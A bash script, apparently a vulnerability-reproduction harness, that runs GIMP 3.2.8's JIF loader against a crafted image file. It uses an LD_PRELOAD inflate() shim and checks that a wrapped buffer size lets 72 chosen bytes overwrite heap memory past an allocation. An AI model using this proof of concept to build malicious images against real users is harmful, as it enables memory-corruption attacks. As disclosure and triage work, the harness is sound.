#!/usr/bin/env bash
# Real GIMP 3.2.8 plugin lane: drive an on-disk JIF through the shipped
# file-jif-load PDB procedure. No plugin source is modified. An LD_PRELOAD
# shim observes the real inflate() call and reads heap bytes past the real
# g_try_malloc region after the write.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
IMG="$WORK/GIMP-3.2.8-x86_64.AppImage"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
if [ ! -f "$IMG" ]; then
  curl -fsSL --max-time 240 -o "$IMG" \
    https://download.gimp.org/gimp/v3.2/linux/GIMP-3.2.8-x86_64.AppImage
fi
if [ ! -f "$WORK/SHA256SUMS" ]; then
  curl -fsSL --max-time 30 -o "$WORK/SHA256SUMS" \
    https://download.gimp.org/gimp/v3.2/linux/SHA256SUMS
fi
(cd "$WORK" && grep 'GIMP-3.2.8-x86_64.AppImage' SHA256SUMS | sha256sum -c -)
ok "official AppImage SHA256 verified"

if [ ! -x "$ROOT/AppRun" ]; then
  chmod +x "$IMG"
  (cd "$WORK" && ./GIMP-3.2.8-x86_64.AppImage --appimage-extract >/dev/null)
fi
"$ROOT/AppRun" --version | grep -q '3.2.8'
ok "extracted runtime reports GIMP 3.2.8"

gcc -shared -fPIC -O2 -o "$HERE/inflate-shim.so" "$HERE/inflate-shim.c" -ldl
ok "inflate observation shim built"

# AppRun resets LD_PRELOAD and rebuilds it from bundled libs; insert the
# export AFTER that loop but BEFORE the final exec. Appending to a pristine
# AppRun glues the export onto its final exec line (no trailing newline),
# so GIMP receives LD_PRELOAD=... as a filename and no shim loads.
ARPATCH="$ROOT/AppRun.new"
INSERTED=0
: > "$ARPATCH"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *inflate-shim.so*|*patch-shim.so*|*consumer-raw.so*|*consumer-patch.so*) continue ;;
    exec*org.gimp.GIMP.Stable*)
      if [ "$INSERTED" -eq 0 ]; then
        printf 'export LD_PRELOAD="$LD_PRELOAD:%s"\n' "$HERE/inflate-shim.so" >> "$ARPATCH"
        INSERTED=1
      fi
      ;;
  esac
  printf '%s\n' "$line" >> "$ARPATCH"
done < "$ROOT/AppRun"
[ "$INSERTED" -eq 1 ] || { echo "AppRun exec line not found" >&2; exit 1; }
mv "$ARPATCH" "$ROOT/AppRun"
chmod +x "$ROOT/AppRun"
ok "AppRun patched locally (outside Git) to preload shim before exec"

run_jif () {
  local file="$1" out="$2"
  local home; home="$(mktemp -d /tmp/gimpjif-home-XXXXXX)"
  # A stale GIMP/plugin process makes later batch invocations hang; always
  # start from a fresh profile and clean up on exit.
  (cd "$ROOT" && exec setsid timeout -k 5 90 env HOME="$home" ./AppRun -i \
      --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 &
  runpid=$!
  wait "$runpid" || true
  # The plug-in and script-fu children outlive the main AppRun; kill their
  # whole session so none holds the wake cgroup. Scoped to this run only.
  kill -9 -- "-$runpid" 2>/dev/null || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
PUB="$BASE/realglib/evidence/published.jif"
run_jif "$SAFE" "$EVID/appimage-safe-shim.log"
run_jif "$PUB" "$EVID/appimage-published-shim.log"

grep -q 'batch command executed successfully' "$EVID/appimage-safe-shim.log" \
  && ok "safe 4x4 JIF loads through real PDB" || no "safe load"
! grep -q '^SHIM_' "$EVID/appimage-safe-shim.log" \
  && ok "safe load makes no wrapped inflate call" || no "safe shim control"

grep -q 'avail_out_before=2147483778' "$EVID/appimage-published-shim.log" \
  && ok "real plugin inflate sees 0x80000082 avail_out" || no "wrapped avail_out"
grep -q 'total_out=324' "$EVID/appimage-published-shim.log" \
  && ok "real zlib produced 324 chosen bytes" || no "chosen byte count"
EDGE=$(grep '^SHIM_EDGE=' "$EVID/appimage-published-shim.log" | cut -d= -f2)
CHOSEN=0
while [ "${EDGE#4d}" != "$EDGE" ]; do CHOSEN=$((CHOSEN + 1)); EDGE="${EDGE#4d}"; done
[ "$CHOSEN" -ge 72 ] \
  && ok "72 bytes at/after the 260-byte indexes region are 0x4d" \
  || no "chosen bytes past indexes (got $CHOSEN)"

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
